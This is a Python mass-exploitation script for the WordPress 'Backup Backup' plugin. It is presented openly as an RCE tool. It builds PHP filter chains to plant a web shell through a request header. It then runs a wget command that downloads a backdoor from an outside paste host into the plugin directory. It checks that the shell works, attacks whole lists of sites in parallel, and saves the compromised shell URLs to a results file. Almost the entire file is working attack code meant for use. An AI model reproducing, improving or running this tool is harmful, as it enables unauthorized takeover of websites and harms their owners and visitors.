#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════╗
║                      PEGASUS RCE TOOL v1.0                       ║
║         WordPress Backup Backup Plugin Exploit (CVE-2023)        ║
║                    Author: Open Source Community                 ║
║                Usage: python pegasus_rce.py sites.txt            ║
╚══════════════════════════════════════════════════════════════════╝

Description:
    This tool exploits the PHP Filter Chain vulnerability in the 
    WordPress "Backup Backup" plugin to achieve Remote Code Execution (RCE).
"""

import sys
import requests
from multiprocessing.dummy import Pool
from colorama import init, Fore, Style
import base64
import random
import string
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# ================================
# PHP FILTER CHAIN GENERATOR CLASS
# ================================
class PHPFilterChainGenerator:
    """
    Generates PHP filter chains for encoding/decoding payloads
    using various iconv and base64 conversions.
    """
    
    def __init__(self):
        # Character mapping for filter chain conversions
        self.conversions = {
            "0": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
            "1": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
            "2": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
            "3": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
            "4": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
            "5": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
            "6": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
            "7": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
            "8": "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
            "9": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
            "A": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
            "a": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
            "B": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
            "b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
            "C": "convert.iconv.UTF8.CSISO2022KR",
            "c": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
            "D": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
            "d": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
            "E": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
            "e": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
            "F": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
            "f": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
            "g": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
            "G": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
            "H": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
            "h": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
            "I": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
            "i": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
            "J": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
            "j": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
            "K": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
            "k": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
            "L": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
            "l": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
            "M": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
            "m": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
            "N": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
            "n": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
            "O": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
            "o": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
            "P": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
            "p": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
            "q": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
            "Q": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
            "R": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
            "r": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
            "S": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
            "s": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
            "T": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
            "t": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
            "U": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
            "u": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
            "V": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
            "v": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
            "W": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
            "w": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
            "X": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
            "x": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
            "Y": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
            "y": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
            "Z": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
            "z": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
            "/": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
            "+": "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
            "=": "",
        }

    def generate_filter_chain(self, chain: str) -> str:
        """
        Generate a complete PHP filter chain for the given payload.
        
        Args:
            chain: The payload string to encode
            
        Returns:
            A PHP filter wrapper string
        """
        # Encode the chain to base64
        chain_bytes = chain.encode("utf-8")
        chain_b64 = base64.b64encode(chain_bytes).decode("utf-8").replace("=", "")
        
        # Build the filter chain
        filters = "convert.iconv.UTF8.CSISO2022KR|"
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|"
        
        # Process each character in reverse
        for c in chain_b64[::-1]:
            filters += self.conversions.get(c, "") + "|"
            filters += "convert.base64-decode|"
            filters += "convert.base64-encode|"
            filters += "convert.iconv.UTF8.UTF7|"
        
        filters += "convert.base64-decode"
        
        return f"php://filter/{filters}/resource=php://temp"


# ================================
# MAIN EXPLOIT CLASS
# ================================
class PegasusRCE:
    """
    Main exploit class for WordPress Backup Backup plugin RCE.
    """
    
    # Webhook/backdoor URL (can be changed)
    BACKDOOR_URL = "https://textbin.net/raw/y8zus4kuc6"
    
    # Target plugin endpoint
    VULNERABLE_ENDPOINT = "/wp-content/plugins/backup-backup/includes/backup-heart.php"
    
    # PHP web shell payload
    WEBSHELL_PAYLOAD = "<?=`$_POST[ova]`?>"
    
    # User-Agent strings for rotation
    USER_AGENTS = [
        'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    ]
    
    def __init__(self):
        self.generator = PHPFilterChainGenerator()
        self.successful_shells = []
    
    def generate_random_filename(self, length: int = 3) -> str:
        """Generate a random filename for the backdoor shell."""
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        return f"{random_part}@x7root.php"
    
    def create_filter_payload(self) -> str:
        """Create the filter chain payload."""
        return self.generator.generate_filter_chain(self.WEBSHELL_PAYLOAD)
    
    def get_headers(self, use_content_dir: bool = False) -> dict:
        """Get HTTP headers for requests."""
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0' if not use_content_dir else 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': random.choice(self.USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' if not use_content_dir else '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        }
        
        if use_content_dir:
            headers['content-dir'] = self.create_filter_payload()
        
        return headers
    
    def exploit_target(self, target_url: str) -> bool:
        """
        Attempt to exploit a single target.
        
        Args:
            target_url: The target WordPress URL
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Normalize URL
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'http://' + target_url
            
            # Construct vulnerable endpoint URL
            vuln_url = target_url.rstrip('/') + self.VULNERABLE_ENDPOINT
            random_filename = self.generate_random_filename()
            
            # Step 1: Send filter chain payload
            headers_with_payload = self.get_headers(use_content_dir=True)
            response = requests.post(vuln_url, headers=headers_with_payload, verify=False, timeout=20)
            
            if response.status_code == 200:
                # Step 2: Download and deploy backdoor
                backdoor_headers = self.get_headers()
                exploit_data = {"ova": f'wget {self.BACKDOOR_URL} -O {random_filename}'}
                
                deploy_response = requests.post(vuln_url, headers=backdoor_headers, data=exploit_data, verify=False, timeout=20)
                
                if deploy_response.status_code == 200:
                    # Step 3: Verify shell is working
                    shell_url = target_url.rstrip('/') + f'/wp-content/plugins/backup-backup/includes/{random_filename}'
                    check_response = requests.get(shell_url, headers=self.get_headers(), verify=False, timeout=20)
                    
                    if 'x7root-Tools' in str(check_response.content):
                        print(f"{Fore.GREEN}[+] SUCCESS: {shell_url}{Style.RESET_ALL}")
                        self.successful_shells.append(shell_url)
                        return True
                    else:
                        print(f"{Fore.YELLOW}[!] Shell uploaded but not working: {target_url}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] Failed to deploy backdoor: {target_url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Target not vulnerable: {target_url} (Status: {response.status_code}){Style.RESET_ALL}")
                
        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[-] Timeout: {target_url}{Style.RESET_ALL}")
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[-] Connection error: {target_url}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error with {target_url}: {str(e)}{Style.RESET_ALL}")
        
        return False
    
    def save_results(self, filename: str = "Results.txt"):
        """Save successful shells to file."""
        if self.successful_shells:
            with open(filename, 'a') as f:
                for shell in self.successful_shells:
                    f.write(shell + '\n')
            print(f"{Fore.GREEN}[+] Results saved to {filename}{Style.RESET_ALL}")
    
    def run(self, targets_file: str, workers: int = 75):
        """
        Run the exploit against multiple targets.
        
        Args:
            targets_file: Path to file containing target URLs (one per line)
            workers: Number of concurrent threads
        """
        try:
            with open(targets_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File not found: {targets_file}{Style.RESET_ALL}")
            sys.exit(1)
        
        print(f"{Fore.CYAN}[+] Loaded {len(targets)} targets{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Starting exploit with {workers} workers...{Style.RESET_ALL}\n")
        
        # Create thread pool and execute
        pool = Pool(workers)
        pool.map(self.exploit_target, targets)
        pool.close()
        pool.join()
        
        # Save results
        self.save_results()
        
        # Print summary
        print(f"\n{Fore.CYAN}[+] Exploit completed!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Successful shells: {len(self.successful_shells)}{Style.RESET_ALL}")


# ================================
# ENTRY POINT
# ================================
def show_banner():
    """Display tool banner."""
    banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██████╗  ███████╗ ██████╗  █████╗ ███████╗██╗   ██╗███████╗    ║
║   ██╔══██╗██╔════╝██╔════╝ ██╔══██╗██╔════╝██║   ██║██╔════╝    ║
║   ██████╔╝█████╗  ██║  ███╗███████║███████╗██║   ██║███████╗    ║
║   ██╔═══╝ ██╔══╝  ██║   ██║██╔══██║╚════██║██║   ██║╚════██║    ║
║   ██║     ███████╗╚██████╔╝██║  ██║███████║╚██████╔╝███████║    ║
║   ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝    ║
║                                                                  ║
║                    REMOTE CODE EXECUTION TOOL                    ║
║                    WordPress Backup Backup Plugin                ║
║                           v1.0                                   ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
{Fore.YELLOW}[!] Usage: python pegasus_rce.py <targets.txt>{Style.RESET_ALL}
{Fore.YELLOW}[!] Example: python pegasus_rce.py sites.txt{Style.RESET_ALL}
    """
    print(banner)


def main():
    """Main entry point."""
    if len(sys.argv) != 2:
        show_banner()
        print(f"{Fore.RED}[!] Error: Missing targets file{Style.RESET_ALL}")
        sys.exit(1)
    
    targets_file = sys.argv[1]
    
    # Optional: Allow worker count as third argument
    workers = 75
    if len(sys.argv) > 2:
        try:
            workers = int(sys.argv[2])
        except ValueError:
            pass
    
    show_banner()
    
    # Run exploit
    exploit = PegasusRCE()
    exploit.run(targets_file, workers)


if __name__ == "__main__":
    main()